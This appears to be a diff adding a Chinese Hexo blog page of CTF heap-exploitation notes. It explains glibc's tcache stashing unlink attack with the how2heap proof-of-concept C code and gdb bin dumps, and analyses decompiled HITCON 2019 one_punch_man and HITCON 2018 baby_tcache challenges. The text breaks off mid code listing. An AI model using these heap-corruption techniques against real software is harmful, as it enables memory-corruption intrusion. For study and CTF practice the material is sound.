@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="tcache stashing unlink attack 这种攻击利用的是 tcache bin 有剩余 (数量小于 TCACHE_MAX_BINS ) 时，同大小的 small bin 会放进 tcache 中 (这种情况可以用 calloc 分配同大小堆块触发，因为 calloc 分配堆块时不从 tcache bin 中选取)。在获取到一个 smallbin 中的一个 chunk 后会如果">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tcache">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/16/tcache/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="tcache stashing unlink attack 这种攻击利用的是 tcache bin 有剩余 (数量小于 TCACHE_MAX_BINS ) 时，同大小的 small bin 会放进 tcache 中 (这种情况可以用 calloc 分配同大小堆块触发，因为 calloc 分配堆块时不从 tcache bin 中选取)。在获取到一个 smallbin 中的一个 chunk 后会如果">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-05-16T07:57:49.000Z">
+<meta property="article:modified_time" content="2022-05-20T10:17:03.528Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="堆">
+<meta property="article:tag" content="tcache">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/16/tcache/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>tcache | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/16/tcache/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          tcache
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-16 15:57:49" itemprop="dateCreated datePublished" datetime="2022-05-16T15:57:49+08:00">2022-05-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-20 18:17:03" itemprop="dateModified" datetime="2022-05-20T18:17:03+08:00">2022-05-20</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h3><blockquote>
+<p>这种攻击利用的是 tcache bin 有剩余 (数量小于 <code>TCACHE_MAX_BINS</code> ) 时，同大小的 small bin 会放进 tcache 中 (这种情况可以用 <code>calloc</code> 分配同大小堆块触发，因为 <code>calloc</code> 分配堆块时不从 tcache bin 中选取)。在获取到一个 <code>smallbin</code> 中的一个 chunk 后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个 small bin 的 bk 指针时，其可以在任意地址上写一个 libc 地址 (类似 <code>unsorted bin attack</code> 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。</p>
+</blockquote>
+<h4 id="how2heap中的poc"><a href="#how2heap中的poc" class="headerlink" title="how2heap中的poc"></a>how2heap中的poc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var addr is:%p\n&quot;</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_lis addr is:%p\n&quot;</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target addr is:%p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    </span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target now: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    </span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体原理其实引言里说的很清楚，只是第一次看可能没那么清楚，跟着poc走一次就知道是什么意思了</p>
+<p>到第29行为止，bin结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x602300 —▸ 0x602760 —▸ 0x6026c0 —▸ 0x602620 —▸ 0x602580 ◂— ...</span><br><span class="line"></span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602390 —▸ 0x602250 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x602390</span><br></pre></td></tr></table></figure>
+
+<p>接下来<code>malloc(0xa0);</code>的目的是触发malloc_consolidate()，将unsorted bin中的chunk放到small bin中，后续再从tcache中取出两个chunk</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  5]: 0x6026c0 —▸ 0x602620 —▸ 0x602580 —▸ 0x6024e0 —▸ 0x602440 ◂— ...</span><br><span class="line"></span><br><span class="line">smallbins</span><br><span class="line">0xa0: 0x602390 —▸ 0x602250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x602390</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>chunk_lis[2][1] = (unsigned long)stack_var;</code>，也就是<code>*(*(chunk_lis[2]) + 8) = (unsigned long)stack_var</code>，修改了<code>chunk_lis[2]</code>所对应chunk的bk指针，对应到上图也就是<code>0x602390</code>的bk指针，此时small bin链表变成如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  5]: 0x6026c0 —▸ 0x602620 —▸ 0x602580 —▸ 0x6024e0 —▸ 0x602440 ◂— ...</span><br><span class="line"></span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x602390 —▸ 0x602250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x602390</span><br><span class="line">BK: 0x602250 —▸ 0x602390 —▸ 0x7fffffffdbf0 —▸ 0x7fffffffdc00 ◂— 0x0</span><br></pre></td></tr></table></figure>
+
+<p>接下来因为是用calloc来申请的，而calloc不会选取tcache中的堆块，所以也就是从small bin中取出<code>0x602250</code>这块chunk（FIFO），接下来：① 因为tcache中还有剩余位置，所以small bin中剩下的两块chunk会被放到tcache中。② 在①的过程中small bin只会检查第一个chunk的完整性，也就是<code>0x602390</code>，而不会对我们伪造的chunk进行检查</p>
+<p>所以最后我们就通过这样的方式将我们伪造的chunk放到了tcache上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0xa0 [  7]: 0x7fffffffdc00 —▸ 0x6023a0 —▸ 0x6026c0 —▸ 0x602620 —▸ 0x602580 ◂— ...</span><br><span class="line"></span><br><span class="line">smallbins</span><br><span class="line">0xa0 [corrupted]</span><br><span class="line">FD: 0x602390 —▸ 0x6026c0 ◂— 0x0</span><br><span class="line">BK: 0x7fffffffdc00 ◂— 0x0</span><br></pre></td></tr></table></figure>
+
+<p>那么下一次<code>malloc(0x90);</code>得到的块就直接是我们伪造的块了</p>
+<h3 id="HITCON-2019-one-punch-man"><a href="#HITCON-2019-one-punch-man" class="headerlink" title="HITCON 2019 one_punch_man"></a>HITCON 2019 one_punch_man</h3><p>知识点：tcache stashing unlink attack</p>
+<p>（libc-2.29）</p>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>程序开了沙箱，要用orw</p>
+<p>程序一开始的操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( !ptr )</span><br><span class="line">  error(<span class="string">&quot;err&quot;</span>, a2);</span><br><span class="line">v3 = ptr;</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">qword_4030 = (ptr &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL) + <span class="number">16</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这几步相当于将heap_base+0x10赋值给了qword_4030。</p>
+<p>菜单，分别对应add、edit、show、free四个功能</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_1B62(<span class="string">&quot;############################\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;👼     One Punch Man      👼\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;############################\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   1. debut               #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   2. rename              #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   3. show                #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   4. retire              #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;#   5. Exit                #\n&quot;</span>);</span><br><span class="line">  sub_1B62(<span class="string">&quot;############################\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_1B62(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>add功能函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">add</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-418h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-414h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+10h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+418h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_1B62(<span class="string">&quot;idx: &quot;</span>);</span><br><span class="line">  v3 = sub_1BF9();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    error(<span class="string">&quot;invalid&quot;</span>, a2);</span><br><span class="line">  sub_1B62(<span class="string">&quot;hero name: &quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">  size = read(<span class="number">0</span>, s, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;io&quot;</span>, s);</span><br><span class="line">  s[size - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x7F</span> || size &gt; <span class="number">0x400</span> )</span><br><span class="line">    error(<span class="string">&quot;poor hero name&quot;</span>, s);</span><br><span class="line">  qword_4040[<span class="number">2</span> * v3] = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">  qword_4048[<span class="number">2</span> * v3] = size;</span><br><span class="line">  <span class="built_in">strncpy</span>(qword_4040[<span class="number">2</span> * v3], s, size);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>别的功能函数没什么特别的所以不贴了，free功能函数那里有一个uaf漏洞</p>
+<p>程序主逻辑中还给了一个后门函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( v4 == 0xC388 )</span><br><span class="line">  backdoor();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">backdoor</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(qword_4030 + <span class="number">0x20</span>) &lt;= <span class="number">6</span> )</span><br><span class="line">    error(<span class="string">&quot;gg&quot;</span>, a2);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x217</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">    error(<span class="string">&quot;err&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x217</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;io&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Serious Punch!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;( ﾟДﾟ)σ弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌弌⊃&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这题的问题就在于add功能函数中所分配的chunk是用calloc得到的，而calloc不会从tcache中取块，这也就意味着即便我们有uaf，能够修改tcache bin chunk的fd指针，我们也没办法在add功能函数中将伪造的chunk取出来。</p>
+<p>我们看到其实后门函数所提供的功能也只是用malloc来申请一个chunk而已，但是这个malloc就能让我们实现将tcache中的假块取出来，所以我们还是得要用到这个后门函数。那么很自然就要想到怎么满足它的条件<code>*(qword_4030 + 0x20) &gt; 6</code>，<code>qword_4030 + 0x20</code>也就是heap_base+0x30，在别的wp里看到说libc-2.29下这个地址保存的是tcache中0x20大小的chunk的个数。</p>
+<p>我们想要修改这个值其实总结下来会有很多方法，但是首先很自然的会想到unsorted bin attack，而由于在libc-2.29下对unsorted bin的拆链增加了完整性检查，使得unsorted bin attack无法再使用了。</p>
+<p>既然这题用了calloc，那么就可以往tcache stashing unlink attack这个方向去想，那么我们总体的流程就是：</p>
+<ol>
+<li>将至少两个chunk从unsorted bin放到small bin，这个过程可以触发malloc_consolidate()来完成</li>
+<li>将small bin中第二个chunk的bk改成目标地址</li>
+<li>从这个small bin中取出一个chunk，同时要保证tcache中至少有两个空位</li>
+</ol>
+<p>很明显可以发现存在一些问题，因为想要直接将small bin大小的chunk放到unsorted bin就意味着对应大小的tcache已经满了，而我们后续用calloc是无法从tcache中取出chunk的，那么也就无法满足第三点中的tcache要有空位的条件。</p>
+<p>这时就有解决这个问题的思路以及知识点了：利用unsorted bin中的last remainder。</p>
+<p>例如</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>]	A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x400</span>);<span class="built_in">free</span>(A);	*<span class="number">7</span></span><br><span class="line">[<span class="number">2</span>]	A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x400</span>);<span class="built_in">free</span>(A);	<span class="comment">//into unsorted bin</span></span><br><span class="line">[<span class="number">3</span>]	A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x400</span><span class="number">-0x100</span>);			<span class="comment">//last remainder size == 0x100</span></span><br><span class="line">[<span class="number">4</span>]	<span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x400</span>);			<span class="comment">//last remainder into small bin</span></span><br></pre></td></tr></table></figure>
+
+<p>解释：首先将0x400大小的tcache塞满，此时再free一块0x400的chunk，这个chunk就会进入到unsorted bin中。然后申请0x300大小的chunk，那么这个0x310的chunk就会从unsorted bin里割出来，last remainder就是剩下的0x100。最后申请一个比0x100大的chunk，last remainder就会直接被放进对应的bin中。</p>
+<h3 id="HITCON-2018-PWN-baby-tcache"><a href="#HITCON-2018-PWN-baby-tcache" class="headerlink" title="HITCON 2018 PWN baby_tcache"></a>HITCON 2018 PWN baby_tcache</h3><p>（libc-2.27）</p>
+<p>这题的难点在于没有泄漏点，要知道怎么修改<code>_IO_2_1_stdout_</code>这个结构体来完成泄漏的知识点。</p>
+<p>在此之前还需要用off-by-one构造堆重叠，以此获得uaf的效果。</p>
+<p>各函数内容如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;🍊      Baby Tcache      🍊&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$   1. New heap           $&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$   2. Delete heap        $ &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$   3. Exit               $ &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td 